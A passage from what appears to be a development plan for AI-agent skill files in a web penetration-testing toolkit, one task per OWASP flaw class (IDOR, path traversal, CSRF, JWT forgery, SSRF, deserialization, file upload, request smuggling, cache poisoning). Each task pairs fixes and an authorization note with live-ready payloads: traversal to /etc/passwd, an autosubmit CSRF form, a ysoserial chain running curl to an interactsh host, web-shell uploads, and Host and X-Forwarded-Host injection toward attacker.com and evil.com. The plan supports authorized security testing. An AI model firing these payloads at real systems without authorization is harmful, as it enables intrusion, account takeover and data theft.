   - **MCP:** `burp_match_replace_set(rules=[{"match": "session=<USER_A>", "replace": "session=<USER_B>", "type": "request_header", "enabled": true}])`; `burp_repeater_send(raw_base64=<b64 of User A's request>, ...)`; inspect response.
5. `## Interpret results` — User B receiving User A's data = confirmed IDOR. Partial leak (some fields returned) = still a finding. False positive: server returns 200 with empty payload = may be access-controlled at the field level; check actual contents.
6. `## Finding writeup` — title `Insecure Direct Object Reference at <endpoint>`. Severity: unauthenticated access = Critical; cross-user read = High; cross-user write = High-Critical. Evidence: both requests (victim's and attacker-session), both responses, `burp_repeater_send` reproduction. Fix: authorize every object access on the server side; use session-scoped object lookups.
7. `## References` — OWASP WSTG ATHZ-04, PortSwigger IDOR (`https://portswigger.net/web-security/access-control`), CWE-639.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-idor (session swap via match-replace)"`.

---

### Task 12: `.claude/skills/testing-missing-function-access/SKILL.md`

**Source material:** Spec "testing-missing-function-access"; `mcp-burp/SKILL.md`; `recon-content-discovery/SKILL.md`, `recon-api-enum/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-missing-function-access`

**Frontmatter:**
```yaml
---
name: testing-missing-function-access
description: Test for OWASP A01 Missing Function-Level Access Control — forced browsing to admin/privileged endpoints without checks.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-content-discovery`, `recon-api-enum`, `mcp-burp`. Paragraph: app has distinct privilege tiers (admin/moderator/user); each endpoint should enforce role.
2. `## Signal to look for` — endpoints under `/admin`, `/internal`, `/api/v1/admin`; endpoints that only appear in admin UIs; response differential between authenticated and unauthenticated (200 vs 302) without role check.
3. `## Test steps` — (1) Enumerate admin paths via `recon-content-discovery` wordlists. (2) Issue each as a low-privileged user via `burp_repeater_send`. (3) Observe response: 200 = no role check; 403 = protected. (4) Also check unauthenticated access.
4. `## Tool commands`:
   - **Shell:** `ffuf -u https://target.example.com/FUZZ -w admin-paths.txt -H "Cookie: session=<LOWPRIV>" -mc 200` (`# Success: any 200 responses indicate missing role check`).
   - **MCP:** `burp_sitemap(prefix="https://target.example.com/admin")` to list admin paths Burp has seen; re-issue via `burp_repeater_send` under low-priv session.
5. `## Interpret results` — 200 response to an admin endpoint under a non-admin session = confirmed. False positive: endpoint exists but returns empty/stub data for non-admins; verify the response contains admin-only info.
6. `## Finding writeup` — title `Missing Function-Level Access Control at <endpoint>`. Severity: admin access via low-priv = Critical; admin access unauthenticated = Critical. Evidence: low-priv request + response showing admin data; same request as admin for comparison. Fix: enforce role on every admin endpoint; middleware-level RBAC.
7. `## References` — OWASP WSTG ATHZ-02, PortSwigger Access Control, CWE-284.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-missing-function-access (forced browsing admin endpoints)"`.

---

### Task 13: `.claude/skills/testing-privilege-escalation/SKILL.md`

**Source material:** Spec "testing-privilege-escalation"; `mcp-burp/SKILL.md`; `recon-api-enum/SKILL.md`, `recon-sitemap-crawl/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-privilege-escalation`

**Frontmatter:**
```yaml
---
name: testing-privilege-escalation
description: Test for OWASP A01 Privilege Escalation — horizontal (peer user) and vertical (role uplift) via parameter tampering and role-assignment endpoints.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-api-enum`, `recon-sitemap-crawl`, `mcp-burp`. Paragraph: multi-tenant app with role/ownership assignment flows.
2. `## Signal to look for` — profile-update endpoints including a `role` or `isAdmin` field; tenant-switching APIs; invite/grant endpoints.
3. `## Test steps` — (1) Capture profile-update request. (2) Add `role=admin` or `isAdmin=true` to body; replay via `burp_repeater_send`. (3) Check resulting permissions (hit an admin endpoint). (4) Horizontal: tamper `userId` to a peer's and replay.
4. `## Tool commands`:
   - **Shell:** `curl -X PATCH -H "Cookie: ..." --data '{"role":"admin"}' https://target.example.com/api/users/me` (`# Success: 200 + account now has admin role`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64 of mutated profile update>, host=..., tab_name="privesc-probe")`; verify via `burp_repeater_send` of an admin-only endpoint.
5. `## Interpret results` — successful role change + subsequent admin access = confirmed. False positive: server accepts the field but ignores it (re-verify admin capability after).
6. `## Finding writeup` — title `Privilege Escalation via <endpoint> <parameter>`. Severity: role uplift to admin = Critical; horizontal peer access = High. Evidence: mutation request + response, admin-endpoint access proof after. Fix: never accept role from client; server-side assignment only; audit logs on role changes.
7. `## References` — OWASP WSTG ATHZ-03, PortSwigger Access Control, CWE-269.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-privilege-escalation (horizontal + vertical)"`.

---

### Task 14: `.claude/skills/testing-path-traversal/SKILL.md`

**Source material:** Spec "testing-path-traversal"; `mcp-burp/SKILL.md`; `recon-content-discovery/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-path-traversal`

**Frontmatter:**
```yaml
---
name: testing-path-traversal
description: Test for OWASP A01 Path Traversal / LFI in file-serving parameters — ../, encoded variants, null-byte bypass.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-content-discovery`, `mcp-burp`. Paragraph: endpoint serves files by user-provided name or path.
2. `## Signal to look for` — `filename=`, `path=`, `file=`, `doc=` parameters; file-download endpoints.
3. `## Test steps` — (1) Baseline: request a known-valid file (e.g. `?file=welcome.txt`). (2) Traversal probe: `../../../../etc/passwd` and encoded variants (`%2e%2e%2f`, `..%2f`, double-encoded). (3) Null-byte bypass (older systems): `?file=../../../etc/passwd%00.txt`. (4) Confirm sensitive-file read.
4. `## Tool commands`:
   - **Shell:** `curl "https://target.example.com/download?file=../../../../etc/passwd"` (`# Success: response body contains root:x:0:0:`); `ffuf -u "https://target.example.com/download?file=FUZZ" -w lfi-wordlist.txt -mr "root:"`.
   - **MCP:** `burp_repeater_send(raw_base64=<b64 of traversal request>, host=..., tab_name="lfi-probe")`; inspect response via `burp_proxy_request(id=<N>)`.
5. `## Interpret results` — file contents in response = confirmed. False positives: MIME-type check passes the first byte only (try various file types); absolute paths sometimes work where relative don't.
6. `## Finding writeup` — title `Path Traversal in <parameter>`. Severity: arbitrary file read = High; source-code disclosure = High; `/etc/passwd`-style = High. Evidence: request URL, response with file contents. Fix: canonicalise path then verify it starts with the allowed base directory; avoid accepting path input from users — use an ID that maps to server-side filename.
7. `## References` — OWASP WSTG ATHZ-01, PortSwigger Directory traversal (`https://portswigger.net/web-security/file-path-traversal`), CWE-22.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-path-traversal (../ + encoding + null-byte)"`.

---

### Task 15: `.claude/skills/testing-csrf/SKILL.md`

**Source material:** Spec "testing-csrf"; `mcp-burp/SKILL.md`, `mcp-browser/SKILL.md`; `recon-sitemap-crawl/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-csrf`

**Frontmatter:**
```yaml
---
name: testing-csrf
description: Test for OWASP A01 CSRF — missing anti-CSRF tokens, SameSite misconfiguration, GET-based state changes.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-sitemap-crawl`, `mcp-burp`, `mcp-browser`. Paragraph: app has state-changing endpoints (POST, PUT, DELETE) triggered from authenticated sessions.
2. `## Signal to look for` — state-changing endpoints without `X-CSRF-Token` header; cookies without `SameSite=Lax/Strict`; GET endpoints that perform state changes.
3. `## Test steps` — (1) Capture a state-changing request. (2) Remove CSRF token / `Referer`; replay via `burp_repeater_send`. (3) If still successful: craft PoC HTML with `<form action="..." method="POST">` and autosubmit. (4) Host PoC locally; navigate via `browser_navigate` with target session active. (5) Confirm state change.
4. `## Tool commands`:
   - **Shell:** Burp Pro: right-click → Engagement tools → Generate CSRF PoC. Manual:
     ```html
     <form action="https://target.example.com/transfer" method="POST">
       <input name="to" value="attacker"><input name="amount" value="100">
     </form>
     <script>document.forms[0].submit()</script>
     ```
   - **MCP:** `burp_repeater_send` (token removed) to confirm server accepts; `browser_navigate(url="file:///tmp/csrf-poc.html")` for exploitation proof.
5. `## Interpret results` — cross-origin request succeeds = confirmed. Limited cases: request succeeds without token only when SameSite is None and CORS is permissive.
6. `## Finding writeup` — title `CSRF on <endpoint>`. Severity: sensitive state change = High; auth or role change = Critical. Evidence: PoC HTML, request that succeeded without CSRF token, server response. Fix: synchroniser-token pattern; `SameSite=Lax` default; double-submit cookie; require `Origin` or `Referer` checks.
7. `## References` — OWASP WSTG SESS-05, PortSwigger CSRF (`https://portswigger.net/web-security/csrf`), CWE-352.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-csrf (token-absent + PoC + SameSite check)"`.

---

### Task 16: `.claude/skills/testing-auth-bypass/SKILL.md`

**Source material:** Spec "testing-auth-bypass"; `mcp-burp/SKILL.md`; `recon-sitemap-crawl/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-auth-bypass`

**Frontmatter:**
```yaml
---
name: testing-auth-bypass
description: Test for OWASP A07 Authentication Bypass — parameter tampering, forced-browsing of post-auth pages, SQL-injection-in-auth.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-sitemap-crawl`, `mcp-burp`. Paragraph: authenticated routes exist; bypass candidates include SQLi in login, default creds, header-based auth spoofing (`X-Remote-User`), forced browsing past auth redirects.
2. `## Signal to look for` — login endpoint returning different response-lengths for valid vs invalid users (user enumeration — a minor finding, but a candidate input for the bypass); SSO/header-auth (`X-Authenticated-User`, `X-Forwarded-User`); redirect-to-login loops that may be stripped.
3. `## Test steps` — (1) Header-auth probe: request an authed page with `X-Authenticated-User: admin`. (2) SQLi-in-login: username `admin' --` (cross-reference `testing-sqli`). (3) Default credentials (`admin:admin`, `admin:password`, etc.). (4) Forced browsing: request an authed URL directly without session; observe whether it serves or redirects.
4. `## Tool commands`:
   - **Shell:** `curl -H "X-Remote-User: admin" https://target.example.com/admin/dashboard` (`# Success: dashboard renders`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64>, host=..., tab_name="auth-bypass-probe")`; compare responses across bypass techniques.
5. `## Interpret results` — any technique that produces an authenticated-view response without valid credentials = confirmed. False positive: proxy middleware strips `X-Remote-User` at the edge; test directly against the backend if reachable.
6. `## Finding writeup` — title `Authentication Bypass via <technique>`. Severity: full bypass = Critical; limited bypass = High. Evidence: the bypass request, the authenticated response. Fix: technique-specific (server-side session validation; reject trust-header inputs from clients; enforce login-redirect on every authed page).
7. `## References` — OWASP WSTG ATHN-01 through ATHN-04, PortSwigger Authentication (`https://portswigger.net/web-security/authentication`), CWE-287.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-auth-bypass (headers + SQLi + defaults + forced browse)"`.

---

### Task 17: `.claude/skills/testing-session-management/SKILL.md`

**Source material:** Spec "testing-session-management"; `mcp-burp/SKILL.md`; `recon-sitemap-crawl/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-session-management`

**Frontmatter:**
```yaml
---
name: testing-session-management
description: Test for OWASP A07 Session Management flaws — predictable IDs, missing rotation, fixation, weak cookie flags, missing expiry.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-sitemap-crawl`, `mcp-burp`.
2. `## Signal to look for` — `Set-Cookie` without `Secure`, `HttpOnly`, `SameSite`; session IDs that are short/sequential/timestamp-based; unchanged session ID across login boundary (fixation).
3. `## Test steps` — (1) Collect Set-Cookie headers via `burp_proxy_history(contains="Set-Cookie")`. (2) Inspect flags; note missing `Secure`, `HttpOnly`, `SameSite`. (3) Fixation: log in with a pre-issued session ID; observe whether server rotates it. (4) Predictability: collect 100+ IDs via Burp Sequencer (Pro) or scripted login; assess entropy.
4. `## Tool commands`:
   - **Shell:** `curl -sI -c - https://target.example.com/login | grep -i 'set-cookie'` (`# Success: Set-Cookie visible; inspect flags`).
   - **MCP:** `burp_proxy_history(contains="Set-Cookie", limit=100)`; `burp_proxy_request(id=<N>)` for raw Set-Cookie header.
5. `## Interpret results` — missing flags per cookie; fixation confirmed when pre-login and post-login IDs match; predictability confirmed by a consistent pattern in sampled IDs.
6. `## Finding writeup` — title `Session <issue> on <cookie>`. Severity: session fixation = High; predictable IDs = High; missing Secure = Medium; missing HttpOnly = Medium. Evidence: Set-Cookie header excerpts, before/after login cookie comparison. Fix: HTTPS-only + Secure flag; HttpOnly; SameSite=Lax default; rotate session ID on login; use cryptographically random IDs.
7. `## References` — OWASP WSTG SESS-01 through SESS-09, PortSwigger Sessions (implicit in authentication and CSRF topics), CWE-384, CWE-614.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-session-management (flags + fixation + entropy)"`.

---

### Task 18: `.claude/skills/testing-jwt/SKILL.md`

**Source material:** Spec "testing-jwt"; `mcp-burp/SKILL.md`; `recon-sitemap-crawl/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-jwt`

**Frontmatter:**
```yaml
---
name: testing-jwt
description: Test for OWASP A07 JWT flaws — algorithm confusion (alg:none, HS256/RS256 swap), weak signing, kid path traversal, exp bypass.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-sitemap-crawl`, `mcp-burp`.
2. `## Signal to look for` — `Authorization: Bearer eyJhbG...` header; tokens starting with `eyJhbGciOiJub25lIn0` (alg:none already set); `kid` claim in header.
3. `## Test steps` — (1) Decode token via `jwt_tool -t <token>`. (2) alg:none attack: set `"alg":"none"`, remove signature; replay. (3) HS256/RS256 confusion: sign HS256 with the server's public key. (4) kid path traversal: `"kid":"../../dev/null"` and similar. (5) Expiration bypass: manipulate `exp` and replay.
4. `## Tool commands`:
   - **Shell:** `jwt_tool <token> -X a` (alg:none exploitation).
   - **MCP:** `burp_repeater_send(raw_base64=<b64 with forged token>, host=..., tab_name="jwt-probe")`; inspect response.
5. `## Interpret results` — server accepting the forged token = confirmed. False positive: client-side-only check; confirm by having the forged token yield server-side authorization (e.g. access to an admin endpoint).
6. `## Finding writeup` — title `JWT <technique> flaw on <endpoint>`. Severity: alg:none or signing-key exposure = Critical; algorithm confusion = Critical; weak secret = High. Evidence: decoded token, forged token, authenticated request + response. Fix: whitelist allowed algorithms; reject `none`; use distinct keys for different roles; validate `kid` against allow-list.
7. `## References` — OWASP WSTG SESS-10, PortSwigger JWT attacks (`https://portswigger.net/web-security/jwt`), CWE-347.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-jwt (alg:none + HS/RS confusion + kid + exp)"`.

---

### Task 19: `.claude/skills/testing-password-reset/SKILL.md`

**Source material:** Spec "testing-password-reset"; `mcp-burp/SKILL.md`; `recon-sitemap-crawl/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-password-reset`

**Frontmatter:**
```yaml
---
name: testing-password-reset
description: Test for OWASP A07 Password Reset flaws — predictable tokens, host-header injection in reset link, user-enumeration via response differential.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-sitemap-crawl`, `mcp-burp`. Paragraph: app has a "forgot password" flow.
2. `## Signal to look for` — reset-request endpoint; emailed reset link with token; differential response between valid and invalid email.
3. `## Test steps` — (1) User enumeration: POST reset for a known valid email vs invalid — compare response body/length/time. (2) Host-header injection: POST with `Host: attacker.com`; check the emailed link. (3) Token predictability: request multiple resets in quick succession and compare tokens; assess entropy. (4) Token reuse: use an already-consumed token again.
4. `## Tool commands`:
   - **Shell:** `curl -X POST -H "Host: attacker.com" --data 'email=victim@target.com' https://target.example.com/reset` (`# Success: emailed reset link references attacker.com`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64 with injected Host>, host=..., tab_name="reset-probe")`; `burp_proxy_history(contains="reset")` for enumeration differential review.
5. `## Interpret results` — host-header hijack confirmed when the emailed link uses the attacker host. User enumeration confirmed by consistent response differentials. Token reuse confirmed by successful second consumption.
6. `## Finding writeup` — title `Password Reset <issue> at <endpoint>`. Severity: reset-token takeover = Critical; host-header link hijack = Critical; enumeration = Low-Medium. Evidence: request, response, emailed link excerpt (redact victim info). Fix: bind reset tokens to account; invalidate on first use; always use canonical URL (not Host header); return identical response for valid and invalid emails.
7. `## References` — OWASP WSTG ATHN-09, PortSwigger Authentication, CWE-640.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-password-reset (host-header + enumeration + token reuse)"`.

---

### Task 20: `.claude/skills/testing-ssrf/SKILL.md`

**Source material:** Spec "testing-ssrf"; `mcp-burp/SKILL.md`; `recon-api-enum/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-ssrf`

**Frontmatter:**
```yaml
---
name: testing-ssrf
description: Test for OWASP A10 SSRF — cloud metadata, internal services, file:// and gopher:// protocol abuse.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-api-enum`, `mcp-burp`. Paragraph: target fetches URLs server-side (webhooks, image proxies, URL previewers, import-from-URL features).
2. `## Signal to look for` — `url=`, `src=`, `image=`, `callback=` parameters that the server fetches.
3. `## Test steps` — (1) Baseline probe to attacker-controlled host (Burp Collaborator Pro, interactsh, or a VPS with logged access). (2) Cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal` (GCP), `http://169.254.169.254/metadata/instance` (Azure). (3) Internal services: `http://localhost:<port>`, `http://127.0.0.1:22`. (4) Protocol abuse: `file:///etc/passwd`, `gopher://<target>:<port>/...`.
4. `## Tool commands`:
   - **Shell:** `curl "https://target.example.com/fetch?url=http://<interactsh-id>.oast.pro"` (`# Success: interactsh logs inbound HTTP from target's IP`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64 with SSRF payload>, host=..., tab_name="ssrf-probe")`; response body or OOB confirmation.
5. `## Interpret results` — OOB callback confirms network egress; metadata response content confirms cloud-metadata read; file contents confirm `file://` processing. False positives: DNS-only callback (no HTTP) may indicate DNS exfil only, not full SSRF.
6. `## Finding writeup` — title `SSRF in <parameter>`. Severity: cloud metadata read = Critical; internal service access = High; DNS callback only = Medium. Evidence: payload request, OOB log / response with metadata. Fix: allow-list outbound targets; disable unused URL schemes; pin resolutions or block RFC1918 + 169.254.0.0/16 at egress.
7. `## References` — OWASP WSTG SSRF (2021), PortSwigger SSRF (`https://portswigger.net/web-security/ssrf`), CWE-918.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-ssrf (metadata + internal + protocol abuse)"`.

---

### Task 21: `.claude/skills/testing-deserialization/SKILL.md`

**Source material:** Spec "testing-deserialization"; `mcp-burp/SKILL.md`; `recon-tech-fingerprinting/SKILL.md`, `recon-js-analysis/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-deserialization`

**Frontmatter:**
```yaml
---
name: testing-deserialization
description: Test for OWASP A08 Insecure Deserialization — Java (ysoserial), .NET (ysoserial.net), Python pickle, PHP serialize, Node.js.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-tech-fingerprinting`, `recon-js-analysis`, `mcp-burp`. Paragraph: language framework is known and target accepts serialized objects (e.g. Java `rO0`-prefixed base64, PHP `O:` serialization, Python pickle).
2. `## Signal to look for` — base64 strings decoding to language-specific headers; ViewState (`__VIEWSTATE`); Java `AC ED 00 05` bytes; Rails/Django session cookies in a recognisable shape.
3. `## Test steps` — (1) Identify the serialized blob in a request (cookie, body, header). (2) Generate a payload via `ysoserial` (Java) or `ysoserial.net` (.NET) with an OOB gadget chain. (3) Replace the blob and replay via `burp_repeater_send`. (4) Confirm via OOB interactsh log or response-time side-channel.
4. `## Tool commands`:
   - **Shell:** `java -jar ysoserial.jar CommonsCollections5 "curl http://<interactsh-id>.oast.pro" | base64 -w0` (`# Success: base64 payload ready; replace original blob`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64 with replaced serialized blob>, host=..., tab_name="deser-probe")`; OOB confirmation.
5. `## Interpret results` — OOB callback from target = confirmed RCE. False positive: gadget chain mismatch for the deployed library version (try multiple chains).
6. `## Finding writeup` — title `Insecure Deserialization in <parameter>`. Severity: RCE confirmed = Critical; DoS-only (recursion/zip bomb) = High. Evidence: original blob, generated payload, OOB log. Fix: avoid deserializing untrusted data; use JSON with explicit schema; if deserialization is unavoidable, use allowlisted classes.
7. `## References` — OWASP WSTG INPV-11, PortSwigger Deserialization (`https://portswigger.net/web-security/deserialization`), CWE-502.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-deserialization (ysoserial + OOB confirm)"`.

---

### Task 22: `.claude/skills/testing-file-upload/SKILL.md`

**Source material:** Spec "testing-file-upload"; `mcp-burp/SKILL.md`; `recon-content-discovery/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-file-upload`

**Frontmatter:**
```yaml
---
name: testing-file-upload
description: Test for OWASP A01/A04 File Upload vulnerabilities — extension bypass, MIME spoofing, polyglot, path traversal via filename.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-content-discovery`, `mcp-burp`. Paragraph: target accepts file uploads (profile pics, documents, imports).
2. `## Signal to look for` — multipart upload endpoints; filename reflected in response or URL after upload.
3. `## Test steps` — (1) Upload a baseline legitimate file. (2) Extension bypass: upload `shell.php.jpg`, `shell.phtml`, `shell.pHp`, `.htaccess`. (3) MIME spoofing: rename `shell.php` to `shell.jpg`, send with `Content-Type: image/jpeg`. (4) Path traversal via filename: `../../webroot/shell.php`. (5) Polyglot: image with embedded PHP/JS. (6) If upload succeeds: `browser_navigate` to the uploaded file's URL and confirm execution/interpretation.
4. `## Tool commands`:
   - **Shell:** `curl -F 'file=@shell.php;filename=shell.php.jpg' -F 'file_type=image/jpeg' https://target.example.com/upload` (`# Success: 200; URL of uploaded file returned`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64 multipart>, host=..., tab_name="upload-probe")`; `browser_navigate(url="https://target.example.com/uploads/shell.php.jpg")` to test execution.
5. `## Interpret results` — uploaded PHP/JSP/ASPX executing as code = RCE. Stored XSS via SVG upload is a separate positive path. False positive: `.htaccess` accepted but no Apache; test actual interpretation.
6. `## Finding writeup` — title `Unrestricted File Upload in <endpoint>`. Severity: RCE via web shell = Critical; overwrite via traversal = High; stored XSS via upload = High. Evidence: upload request, server response with stored filename, navigation to the file, execution proof. Fix: whitelist extensions server-side; regenerate filenames; store outside web root; serve via a dedicated handler with strict Content-Type.
7. `## References` — OWASP WSTG BUSL-09 / INPV-03, PortSwigger File upload (`https://portswigger.net/web-security/file-upload`), CWE-434.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-file-upload (extension + MIME + traversal + polyglot)"`.

---

### Task 23: `.claude/skills/testing-open-redirect/SKILL.md`

**Source material:** Spec "testing-open-redirect"; `mcp-burp/SKILL.md`; `recon-api-enum/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-open-redirect`

**Frontmatter:**
```yaml
---
name: testing-open-redirect
description: Test for Open Redirect in login-next, SSO-return-to, and download parameters — enables phishing and SSRF pivots.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-api-enum`, `mcp-burp`. Paragraph: `?next=`, `?return_to=`, `?url=`, `?redirect=` parameters.
2. `## Signal to look for` — parameters with URL-like values; 302 responses whose `Location:` echoes a user-controlled value.
3. `## Test steps` — (1) Absolute URL probe: `?next=https://attacker.com`. (2) Scheme-less: `?next=//attacker.com`. (3) Userinfo bypass: `?next=https://target.example.com@attacker.com`. (4) Null and whitespace: `?next=%00https://attacker.com`. (5) Inspect `Location:` header in response.
4. `## Tool commands`:
   - **Shell:** `curl -sI "https://target.example.com/login?next=https://attacker.com" | grep -i 'location'` (`# Success: Location: https://attacker.com`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64>, host=..., tab_name="redirect-probe")`; `burp_proxy_request(id=<N>)` for the full response headers.
5. `## Interpret results` — `Location:` header with attacker-controlled host = confirmed. Partial: host suffix matches allow-list (Foo.com vs FooBank.com) — check exact match logic.
6. `## Finding writeup` — title `Open Redirect in <parameter>`. Severity: SSO-phishing facilitator = Medium-High; pure UX redirect = Low. Evidence: request URL with payload, response `Location:` header. Fix: validate redirect target against an allow-list; relative URLs only; reject scheme-less and userinfo URLs.
7. `## References` — OWASP WSTG CLNT-04, PortSwigger Redirect, CWE-601.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-open-redirect (absolute + scheme-less + userinfo)"`.

---

### Task 24: `.claude/skills/testing-request-smuggling/SKILL.md`

**Source material:** Spec "testing-request-smuggling"; `mcp-burp/SKILL.md`; `recon-tech-fingerprinting/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-request-smuggling`

**Frontmatter:**
```yaml
---
name: testing-request-smuggling
description: Test for HTTP Request Smuggling (desync) — CL.TE, TE.CL, TE.TE variants against front-end/back-end chains.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-tech-fingerprinting`, `mcp-burp`. Paragraph: target has a front-end proxy (nginx, HAProxy, CloudFront, Akamai) in front of a back-end server; the two may interpret `Content-Length` vs `Transfer-Encoding` differently.
2. `## Signal to look for` — both `Content-Length` and `Transfer-Encoding: chunked` accepted; front-end and back-end are different products.
3. `## Test steps` — (1) Detection: send a CL.TE probe with two differently-sized headers; observe response delay or early close. (2) Confirmation: smuggle a second request and retrieve another user's response. Respect RoE — request smuggling can affect other users' traffic; see `methodology-rules-of-engagement`. (3) Use Burp's HTTP Request Smuggler extension for reliable probing.
4. `## Tool commands`:
   - **Shell:** Burp extension primary. Manual example payload:
     ```
     POST / HTTP/1.1
     Host: target.example.com
     Content-Length: 13
     Transfer-Encoding: chunked
     
     0
     
     GET /404 HTTP/1.1
     X-Foo: bar
     ```
     (`# Success: subsequent request from another client returns 404 for a different path`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64 of crafted request>, host=..., tab_name="smuggling-probe")`; requires the HTTP Request Smuggler extension loaded in Burp Pro.
5. `## Interpret results` — confirmed when a smuggled request affects an unrelated response (the canonical proof). Very easy to false-positive — Burp extension's automated confirmation logic is the reliable signal.
6. `## Finding writeup` — title `HTTP Request Smuggling (<variant>) between front-end and back-end`. Severity: confirmed smuggling = Critical; suspected without second-request proof = High. Evidence: crafted payload, before/after HTTP transcript, Burp extension output. Fix: require consistent parsing; front-end should normalise (strip Transfer-Encoding if Content-Length is present, or vice versa); use HTTP/2 end-to-end.
7. `## References` — OWASP WSTG INPV-15 subsection, PortSwigger HTTP request smuggling (`https://portswigger.net/web-security/request-smuggling`), CWE-444.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-request-smuggling (CL.TE / TE.CL / TE.TE)"`.

---

### Task 25: `.claude/skills/testing-cache-poisoning/SKILL.md`

**Source material:** Spec "testing-cache-poisoning"; `mcp-burp/SKILL.md`; `recon-tech-fingerprinting/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-cache-poisoning`

**Frontmatter:**
```yaml
---
name: testing-cache-poisoning
description: Test for Web Cache Poisoning — unkeyed-input reflection, cache-key manipulation, cache deception.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-tech-fingerprinting`, `mcp-burp`. Paragraph: target has a cache layer (CDN, reverse proxy) between users and the origin.
2. `## Signal to look for` — `X-Cache:`, `CF-Cache-Status:`, `Age:` response headers; static-content URLs with cached responses; CDN fingerprint from tech fingerprinting.
3. `## Test steps` — (1) Identify cached endpoint via response headers. (2) Unkeyed-input discovery via Burp "Param Miner" — probe for headers that change the response but aren't in the cache key. (3) Once an unkeyed header is found, poison the cache (payload in the unkeyed header). (4) Confirm by re-fetching without the header from a different session.
4. `## Tool commands`:
   - **Shell:** Burp Param Miner (Pro); manual `curl -H "X-Forwarded-Host: evil.com" https://target.example.com/` then `curl https://target.example.com/` and compare.
   - **MCP:** `burp_repeater_send(raw_base64=<b64 with unkeyed header>, host=..., tab_name="cache-poison")`; `burp_repeater_send` without the header; compare responses.
5. `## Interpret results` — persisted poisoned response = confirmed. DoS-only (cache hits a 5xx) is also a finding.
